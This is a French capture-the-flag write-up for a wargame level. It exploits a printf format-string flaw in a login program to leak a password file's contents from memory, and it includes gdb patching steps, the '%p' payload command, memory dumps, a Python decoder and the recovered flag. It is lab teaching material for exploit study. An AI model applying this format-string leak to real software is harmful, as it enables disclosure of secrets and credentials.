# Level 02

## Introduction

Le programme ouvre et lit le contenu de `/home/users/level03/.pass`. Donc le flag de ce niveau sera en mémoire, et il faut donc pouvoir le contenu de la mémoire qui contient notre flag.

Et on constate qu'on peut exploit le pattern de printf pour afficher la mémoire.

A noté: GDB crash quand on essaye de lancer le level02 car il n'a pas les permissions de lecture le fichier `.pass`.  
Il faudra donc remplacer ce fichier par un fichier temporaire (avec les droits de lecture) pour nos tests.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=60c28629-ef06-4d6a-aa25-bf54ea99c497#Ghidra=224&BinaryNinja=203&angr=167 ;
 2. Pour le debug de notre exploit avec gdb on va modifier `"/home/users/level03/.pass"` par `"/tmp/level02"`.
    - En récupérant le code asm de main, on comprend vite qu'il s'agit de la variable `0x400bb2` à modifier.
 3. On exploit le pattern de printf pour afficher le contenu du fichier.
 4. Via un script python on converti facilement les données au format lisible par un humain.

## Etapes

(Voir [source.c](../source.c) pour le code complet)

Mise en avant du code qui nous intéresse :

```c
#define FLAG_LENGTH 42

int main(int argc, char** argv, char** envp)
{
    char flag[FLAG_LENGTH] = {0};
    char username[100] = {0};
    char password[100] = {0};

	// [...]
	FILE* fp = fopen("/home/users/level03/.pass", &data_400bb0);
	// [...]
	int32_t flength = fread(&flag, 1, FLAG_LENGTH - 1, fp);
    // [...]
	fclose(fp);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
	printf("--[ Username: ");
	fgets(&username, 0x64, stdin);
    // [...]
	printf(&username);
	puts(" does not have access!");
	exit(1);
	/* no return */
}
```

### Preparation GDB

Avec un `disas main` dans gdb. On remarque `0x400bb2` avant fopen.

```text
(gdb) disas main
Dump of assembler code for function main:
   # [...]
   0x0000000000400898 <+132>:   mov    $0x400bb0,%edx
   0x000000000040089d <+137>:   mov    $0x400bb2,%eax <== ici
   0x00000000004008a2 <+142>:   mov    %rdx,%rsi
   0x00000000004008a5 <+145>:   mov    %rax,%rdi
   0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>
```

Avec gdb :

```sh
(gdb) b main
(gdb) r
(gdb) p (char *)0x400bb2
$1 = 0x400bb2 "/home/users/level03/.pass"
#(gdb) p ((char *)0x400bb2)[18] = '2'
(gdb) set {char [26]} 0x400bb2 = "/tmp/level02"
(gdb) p (char *)0x400bb2
$2 = 0x400bb2 "/tmp/level02"
```

On prépare `/tmp/level02`:

*Pour que le programme marche avec gdb, on doit accéder à un fichier avec les droits d’accès suffisant et respecter la même taille (40 caractères, le saut de ligne est par acquis de conscience).*

```sh
level02@OverRide:~$ python -c 'print "a" * 40' + "\n" > /tmp/level02
level02@OverRide:~$ cat -e /tmp/level02
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$
```

### Exploit

Grâce au "fix gdb" ci-dessus, j'ai exploité l'exploit du pattern de printf sur l'username. J’ai vu passer plein de 'a' (0x61) en faisant overflow printf.

Pour la continuité et l'élaboration de l'exploit, on va utiliser l'alphabet pour plus facilement comprendre la position de chacun des caractères.

```sh
echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/level02
echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN" > /tmp/level02
```

Donc :

```text
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
hex :
61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e
```

Avec gdb mon "fix" + exploit pattern printf

```sh
(gdb) b main
(gdb) run < <(python -c 'print "%p " * 40'; echo "b")
(gdb) set {char [26]} 0x400bb2 = "/tmp/level02"
(gdb) c
Continuing.
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
# Avec "aaaaaa..." (0x61616161...) :
0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x6161616161616161 0x6161616161616161 0x6161616161616161 0x6161616161616161 0x6161616161616161 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
# Avec l'alphabet :
0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x6867666564636261 0x706f6e6d6c6b6a69 0x7877767574737271 0x4645444342417a79 0x4e4d4c4b4a494847 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

J'ai élaboré un script python pour convertir le format reverse hexa en string.
 
#### Script Python

Voici le script python :

```py
output = "0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x6867666564636261 0x706f6e6d6c6b6a69 0x7877767574737271 0x4645444342417a79 0x4e4d4c4b4a494847 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!"

arr = output.split()[21:26]

flag = ''
for str in arr:
  #if str.startswith("0x"):
  flag = flag + bytes.fromhex(str[2:]).decode('utf8')[::-1]

print(flag) # Output: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
```

(Voir [script2.py](./script2.py) pour le code complet)

On constate donc qu'on a bien notre alphabet (saisi de départ) `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN`.

#### En condition réel

Donc si on utilise en dehors de gdb :

```sh
level02@OverRide:~$ (python -c 'print "%p " * 40'; echo "b") | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe510 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe708 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

Avec mon script python, on obtient le flag en format lisible :
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
